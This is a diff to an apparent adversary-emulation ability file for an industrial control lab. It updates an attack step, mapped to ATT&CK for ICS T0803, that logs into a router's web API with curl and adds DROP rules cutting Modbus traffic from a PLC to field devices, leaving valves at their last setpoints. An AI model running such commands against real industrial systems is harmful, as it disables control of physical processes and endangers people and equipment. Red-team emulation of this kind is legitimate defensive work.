@@ -3,10 +3,8 @@
 - id: b8c9d0e1-8888-8888-8888-000000000004
   name: Router - Block Modbus Command Messages
   description: |
-    Add iptables FORWARD rules to DROP all Modbus TCP traffic from
-    PLC (192.168.95.2) to simulation devices (192.168.95.10-15).
-    This prevents the PLC from sending valve setpoints, leaving
-    field devices at their last commanded position.
+    Add DROP rules via the actual /add endpoint, then /apply to activate.
+    Blocks PLC-to-device Modbus traffic on port 502.
   tactic: inhibit-response-function
   technique_id: T0803
   technique_name: Block Command Message
@@ -16,10 +14,14 @@
     command: >
       for target_ip in 10 11 12 13 14 15; do
         curl -s -b /tmp/router.jar
-        -X POST "http://192.168.90.200:5000/firewall/add"
-        -d "src_ip=192.168.95.2&dst_ip=192.168.95.$target_ip&protocol=tcp&dport=502&action=DROP"
-        2>/dev/null;
+        -d "iface_in=eth1&iface_out=eth1&src=192.168.95.2&dst=192.168.95.$target_ip&proto=tcp&dport=502&action=DROP"
+        "http://192.168.90.200:5000/add"
+        -o /dev/null;
+        echo "RULE_ADDED: 192.168.95.2 -> 192.168.95.$target_ip:502 DROP";
       done &&
       curl -s -b /tmp/router.jar
-      -X POST "http://192.168.90.200:5000/firewall/apply" 2>/dev/null &&
-      echo "MODBUS_COMMANDS_BLOCKED: PLC can no longer reach field devices"
+      -d ""
+      "http://192.168.90.200:5000/apply"
+      -o /dev/null &&
+      echo "MODBUS_COMMANDS_BLOCKED"
+    timeout: 60
